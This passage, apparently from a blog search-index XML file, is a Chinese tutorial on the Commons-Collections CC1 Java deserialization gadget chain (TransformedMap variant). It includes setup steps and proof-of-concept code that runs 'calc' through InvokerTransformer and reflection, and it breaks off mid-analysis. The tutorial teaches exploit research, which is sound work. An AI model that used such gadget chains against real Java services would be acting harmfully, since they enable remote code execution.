<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java反序列化系列漏洞01篇Commons-Collections之TransformMap版CC1链</title>
      <link href="/2025/03/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BTransformMap%E7%89%88CC1%E9%93%BE/"/>
      <url>/2025/03/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BTransformMap%E7%89%88CC1%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="Commons-Collections1一文解读"><a href="#Commons-Collections1一文解读" class="headerlink" title="Commons-Collections1一文解读"></a>Commons-Collections1一文解读</h1><blockquote><p>CC1总共有两种玩法TransformMap版和lazyMap版，本文先解读第一种TransformMap版的CC1。</p></blockquote><h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><h3 id="Commons-Collections"><a href="#Commons-Collections" class="headerlink" title="Commons Collections"></a>Commons Collections</h3><p><code>Commons Collections</code> 是 Apache 提供的 Java 类库，扩展和增强了 <code>Java</code> 集合框架，提供了功能强大、灵活高效的数据结构和工具类，简化集合操作，简化开发者对数据的处理过程。</p><p>例如：</p><ul><li><code>Bag</code> 统计元素出现次数，避免手动计数。</li><li><code>MultiValuedMap</code> 支持一键多值映射，简化多对多关系处理。</li><li><code>BidiMap</code> 实现键值双向查询，避免重复查找。</li><li><code>LRUMap</code> 内建缓存淘汰机制，无需自写逻辑。</li><li><code>CollectionUtils</code> 快速实现集合交集、差集、并集操作。</li></ul><h3 id="CC链"><a href="#CC链" class="headerlink" title="CC链"></a>CC链</h3><p>CC1就是利用<code>Commons Collections</code>构造出来的其中一条反序列化利用链；同样还有其他的CC 链，CC 1-6-3-2-4-5-7-11-CommonsBeanUtils链。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="JDK安装"><a href="#JDK安装" class="headerlink" title="JDK安装"></a>JDK安装</h3><p>CC1链在JDK_8u71修复了，因此我们下载<a href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">jdk8u65</a>版本，可以把安装包放在虚拟机安装，然后把安装的目录复制一下就能用。</p><p>新建Java项目，JKD选择时点从磁盘加载JDK,然后选安装的目录即可<br><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E4%B9%8BCC1%E9%93%BE-20250320174606.png"></p><p>commons-collections选择3.2.1.版本</p><p>pom.xml导入依赖包</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>随便导入个包，看看依赖是否引入成功<br><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E4%B9%8BCC1%E9%93%BE-20250320180955.png"></p><h3 id="反编译问题"><a href="#反编译问题" class="headerlink" title="反编译问题"></a>反编译问题</h3><p>如果在调试时发现源码是<code>.class</code>编译后的文件，可以下载<a href="%5Bhttps://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip%5D(https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip)">openJDK</a>,解压后<br>把&#x2F;src&#x2F;share&#x2F;classes的sun文件放到jdk8u65的src目录。</p><p><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E4%B9%8BCC1%E9%93%BE-20250320175004.png"></p><p>然后在源路径导入即可</p><p><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E4%B9%8BCC1%E9%93%BE-20250320180318.png"></p><h2 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h2><p>我这里提前基础知识写一下，阅读时可以先跳过前置基础部分，等下面用到了这些时再折返回来看。</p><h3 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h3><blockquote><p>反射允许 Java 程序在运行时动态获取类信息、创建对象、调用方法和访问私有成员。我们可以利用Java的反射机制动态调用方法，private的方法也可以调用。</p></blockquote><h4 id="获取类对象"><a href="#获取类对象" class="headerlink" title="获取类对象"></a>获取类对象</h4><ul><li><strong>forName()</strong>  根据指定的类的全限定名，在运行时查找并加载类</li><li><strong>getClass()</strong></li><li>.<strong>class</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionRuntimeDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        </span><br><span class="line">            <span class="comment">// 1️.运行时获取Runtime类</span></span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">runtimeInstance</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            Class&lt;?&gt; cls1 = runtimeInstance.getClass();</span><br><span class="line">            System.out.println(<span class="string">&quot;运行时 `getClass()`: &quot;</span> + cls1.getName());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 2️. 编译时获取Runtime类</span></span><br><span class="line">            Class&lt;?&gt; cls2 = Runtime.class;</span><br><span class="line">            System.out.println(<span class="string">&quot;编译时 `.class` 获取: &quot;</span> + cls2.getName());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 3️. 运行时通过字符串动态加载Runtime类</span></span><br><span class="line">            Class&lt;?&gt; cls3 = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;运行时 `Class.forName()` 获取: &quot;</span> + cls3.getName());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="获取类方法"><a href="#获取类方法" class="headerlink" title="获取类方法"></a>获取类方法</h4><p>通过指定类对象，再利用下面的方法查看类中有哪些方法</p><ul><li><strong>getDeclaredMethods()</strong><br>  回类或接口声明的所有方法，包括 public、private 以及默认方法，但不包括继承的方法</li><li><strong>getMethods()</strong><br>  返回某个类的所有 public 方法，包括其继承类的 public 方法</li><li><strong>getMethod()</strong><br>  只能返回一个特定的方法，例如返回 Runtime 类中的 exec() 方法，该方法的第一个参数为方法名称，后面的参数为方法的参数对应 Class 的对象</li><li><strong>getDeclaredMethod()</strong><br>  getDeclaredFields 方法能够获得类的成员变量数组包括 public、private 和 protected，但是不包括父类的声明字段</li></ul><h4 id="获取类成员变量"><a href="#获取类成员变量" class="headerlink" title="获取类成员变量"></a>获取类成员变量</h4><p>与上面同理，获得特定的类成员变量</p><ul><li><strong>getFields()</strong><br>  能够获取某个类的所有 public 字段，包括父类中的字段。</li><li><strong>getDeclaredFields()</strong><br>  能够获得类的成员变量数组包括 public、private 和 protected，不包括父类的声明字段</li><li><strong>getDeclaredField()</strong><br>  获得类的单个成员变量</li></ul><p>注：反射在硕森星火学的</p><h4 id="反射例子"><a href="#反射例子" class="headerlink" title="反射例子"></a>反射例子</h4><p>利用反射执行<code>Runtime.getRuntime().exec(&quot;calc&quot;);</code>，弹出计算器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Class&lt;?&gt; runtimeClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);  </span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span>runtimeClass.getMethod(<span class="string">&quot;getRuntime&quot;</span>);  </span><br><span class="line">Object getRuntimeinstance=getRuntimeMethod.invoke(<span class="literal">null</span>);  </span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> runtimeClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);  </span><br><span class="line">exec.invoke(getRuntimeinstance,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();  </span><br><span class="line">Class c=Runtime.class;  </span><br><span class="line">Method m= c.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);   </span><br><span class="line">m.invoke(runtime,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9ECommons-Collections%E4%B9%8BCC1%E9%93%BE-20250325153752.png"></p><h3 id="TransformedMap介绍"><a href="#TransformedMap介绍" class="headerlink" title="TransformedMap介绍"></a>TransformedMap介绍</h3><p><code>TransformedMap</code> 是工具包提供的<strong>装饰器（Decorator）</strong>，用于<strong>自动转换 <code>Map</code> 中的键和值</strong>。<br>它在转换新元素时，就会调用Transformer中的transform方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;  </span><br><span class="line">    <span class="built_in">super</span>(map);  </span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;  </span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>三个参数，参数map,代表键值对的集合；keyTransformer和valueTransformer通俗理解就是通过调用方法来对key和value进行加强或者修饰。</p><h3 id="Transformer介绍"><a href="#Transformer介绍" class="headerlink" title="Transformer介绍"></a>Transformer介绍</h3><p><code>Transformer</code> 是一个<strong>接口</strong>，它的作用是<strong>对输入数据进行转换，返回一个新的数据</strong>；并提供了一个待实现的<code>transform()</code>方法，用来定义具体的转换逻辑。</p><p>下方就是<code>Transformer</code>的具体实现类，并且每个实现类都有一个<code>transform()</code>方法：</p><h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>InvokerTransformer的构造函数接收三个参数 方法名、参数类型、参数值；而它的transform方法会接收一个类名来作为构造方法参数<code>methodName</code>的类。</p><p>例如methodName&#x3D;getRuntime，input&#x3D;Runtime,会变成Runtime.getRuntime()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;  </span><br><span class="line">    <span class="built_in">super</span>();  </span><br><span class="line">    iMethodName = methodName;  </span><br><span class="line">    iParamTypes = paramTypes;  </span><br><span class="line">    iArgs = args;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);  </span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, iArgs);  </span><br><span class="line">              </span><br><span class="line">    &#125;...</span><br></pre></td></tr></table></figure><h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>ChainedTransformer构造方法接收一个数组并把它保存在iTransformers中；transform()方法会把数组进行遍历，把上一个遍历的结果当作下一次遍历时的参数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;  </span><br><span class="line">    <span class="built_in">super</span>();  </span><br><span class="line">    iTransformers = transformers;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;  </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;  </span><br><span class="line">        object = iTransformers[i].transform(object);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> object;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>构造方法把接收的参数赋给iConstant，并在调用transform时，不管传入的是什么都会返回iConstant的值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;  </span><br><span class="line">    <span class="built_in">super</span>();  </span><br><span class="line">    iConstant = constantToReturn;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> iConstant;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="TransformMap版CC1反序列化链分析"><a href="#TransformMap版CC1反序列化链分析" class="headerlink" title="TransformMap版CC1反序列化链分析"></a>TransformMap版CC1反序列化链分析</h2><blockquote><p>我在URLDNS链中就已经提到过，反序列化链的本质就是要找<strong>重写了readObject()方法并且可序列化</strong>的入口点，也就是链子的头部；还有可以<strong>执行命令的危险方法(不同类的同名函数反射和动态加载字节码)</strong> 作为尾部；最后用不同类的同名函数将头部和尾部串联起来。</p></blockquote><p>寻找链的顺序就是先找尾部，然后往前找readobject头部。现在从尾部进行解读</p><h3 id="可执行命令的尾部InvokerTransformer"><a href="#可执行命令的尾部InvokerTransformer" class="headerlink" title="可执行命令的尾部InvokerTransformer"></a>可执行命令的尾部InvokerTransformer</h3><p>尾部就是transformer接口的实现方法InvokerTransformer的方法</p><p>我们进入transformer接口查看它的实现类</p><p><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE-20250325163953.png"></p><p><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE-20250325164100.png"></p><p>进入InvokerTransformer，该方法我已在前置基础已经讲过，它可以接收方法名和类名，我们可以传入Runtime类 getRuntime方法 就可以执行命令。</p><p><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE-20250325164151.png"></p><h4 id="反射实现命令执行"><a href="#反射实现命令执行" class="headerlink" title="反射实现命令执行"></a>反射实现命令执行</h4><p>接下来写一个用InvokerTransformer执行命令的poc，同时InvokerTransformer是public不需要反射就可以调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();  </span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line">invokerTransformer.transform(runtime);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE-20250325170603.png"></p><p>执行成功就说明我们这个尾部可以使用，接下来就该继续往上找不同类的相同方法名，也就是看谁还调用了transform()方法。</p><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p>光标放到transform上crtl+alt+shift+f7查看谁调用了transform()<br><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE-20250325171721.png"></p><p>发现TransformedMap下的checkSetValue()方法调用了transform()<br><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE-20250325172017.png"></p><p>右键跳转到源查看<br><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE-20250325172300.png"></p><p>发现checkSetvalue是一个保护方法（只能被同一个类或者子类调用），同时返回了一个<code>valueTransformer.transform()</code></p><p>右键查找用法或者在该类搜索一下valueTransformer，看看谁使用了valueTransformer</p><p><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE-20250325173247.png"></p><p>发现TransformedMap的构造方法提到了它<br><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE-20250325173428.png"></p><p>这样的话我们可以给构造方法的<code>Transformer valueTransformer</code>的参数传入InvokerTransformer，然后去主动调用checksetvalue()方法,这样我们就把这两个类串连起来了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">流程</span><br><span class="line">TransformedMap.decorate(hashmap,<span class="literal">null</span>,InvokerTransformer)</span><br><span class="line">通过调用checkSetvalue</span><br><span class="line">valueTransformer.transform()-&gt;InvokerTransformer.transform()</span><br><span class="line">进而执行命令</span><br></pre></td></tr></table></figure><p>但是我们需要注意，TransformedMap的方法是protected，不能直接实例化，我们需要继续找。</p><p>这里还是在TransformedMap类找到了一个静态方法，该静态类为public，并且return了一个实例化的TransformMap构造方法,这正是我们需要的。</p><p><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE-20250325175304.png"></p><p>我们把这两个类串联起来写一个POC，看看命令能不能执行成功。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC1demo;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;   </span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Class.forName;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();  </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; TestHashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object, Object&gt; decorateTestHashmap = TransformedMap.decorate(TestHashmap,<span class="literal">null</span>,invokerTransformer);  </span><br><span class="line">        Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">checkSetValueMethod</span> <span class="operator">=</span> transformedMapClass.getDeclaredMethod(<span class="string">&quot;checkSetValue&quot;</span>, Object.class);  </span><br><span class="line">        checkSetValueMethod.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        checkSetValueMethod.invoke(decorateTestHashmap, runtime );  </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="POC解读"><a href="#POC解读" class="headerlink" title="POC解读"></a>POC解读</h4><p><strong>第一部分</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();  </span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br></pre></td></tr></table></figure><p>还是利用InvokerTransformer执行<code>Runtime.getRuntime().exec(&quot;calc&quot;)</code>,也就是最后的命令执行部分</p><p><strong>第二部分</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Object, Object&gt; TestHashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(); </span><br><span class="line"> Map&lt;Object, Object&gt; decorateTestHashmap = TransformedMap.decorate(TestHashmap,<span class="literal">null</span>,invokerTransformer); </span><br></pre></td></tr></table></figure><p>创建了一个map,并作为decorate的第一个参数传入，第三个参数invokerTransformer作为valuetransformer传入，便于后续的调用<code>valuetransformer.transform()-&gt;invokerTransformer.transform()</code></p><p><strong>第三部分</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;  </span><br><span class="line"><span class="type">Method</span> <span class="variable">checkSetValueMethod</span> <span class="operator">=</span> transformedMapClass.getDeclaredMethod(<span class="string">&quot;checkSetValue&quot;</span>, Object.class);  </span><br><span class="line">checkSetValueMethod.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">checkSetValueMethod.invoke(decorateTestHashmap, runtime );  </span><br></pre></td></tr></table></figure><p>由于TransformerdMap里的方法checkSetValue()是protected的，不能直接调用，因此使用反射调用该方法；getDeclaredMethod在前置基础的反射已经说明过，可以获取protected的方法，<code>setAccessible(true)</code>使其可以访问以便于调用它；</p><p><code>checkSetValueMethod.invoke(decorateTestHashmap, runtime ); </code>该部分是让获得的方法<code>checkSetValue</code>方法在<code>decorateTestHashmap</code>上调用（等价于在TransformedMap上调用checkSetValue方法;这里需要注意checkSetValue是我们主动调用的），同时把<code>runtime</code>作为参数传入<code>checkSetValue</code>方法中，<code>runtime</code>最终会作为<code>transform()</code>的参数。</p><p>运行命令成功执行，说明串起来的链子没问题。</p><p><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE-20250325201541.png"></p><h4 id="部分流程图"><a href="#部分流程图" class="headerlink" title="部分流程图"></a>部分流程图</h4><p>先给这两个类画一个流程图，方便理解，后续继续补充<br><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE-20250325190118.png"></p><p><strong>中间转换过程</strong><br><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE-20250325190138.png"></p><p>这样我们后小段链子就构造好了，继续往前找，前文中我们的Poc中的checkSetValue是我们写入主动调用的，因此就需要往前找到一个可以调用checkSetValue方法的类。</p><h3 id="AbstractInputCheckedMapDecorator"><a href="#AbstractInputCheckedMapDecorator" class="headerlink" title="AbstractInputCheckedMapDecorator"></a>AbstractInputCheckedMapDecorator</h3><p>右键查找用法</p><p><img 